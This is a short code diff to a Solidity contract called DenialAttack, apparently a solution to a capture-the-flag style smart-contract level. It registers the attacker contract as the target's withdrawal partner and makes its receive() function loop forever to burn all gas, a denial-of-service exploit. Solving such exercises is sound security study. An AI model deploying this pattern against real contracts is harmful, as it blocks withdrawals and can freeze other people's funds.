@@ -12,15 +12,11 @@ contract DenialAttack {
 
     constructor(address _denialContractAddress) {
         denialContract = IDenial(_denialContractAddress);
-    }
-
-    function attack() public {
-        // Set this contract as the withdrawal partner
         denialContract.setWithdrawPartner(address(this));
     }
 
     // This function will consume all available gas
     receive() external payable {
-        assert(false);
+        while (true) {}
     }
 }
